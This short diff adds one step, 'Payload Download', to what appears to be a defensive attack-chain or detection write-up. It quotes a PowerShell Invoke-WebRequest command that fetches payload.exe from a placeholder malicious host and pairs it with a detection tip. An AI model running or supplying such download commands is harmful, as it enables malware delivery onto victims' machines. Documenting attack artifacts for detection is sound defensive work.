@@ -1,0 +1,6 @@
+
+4. **Payload Download**
+   - Application: PowerShell
+   - User Action: The macro triggers a PowerShell command to download a malicious executable.
+   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
+   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.
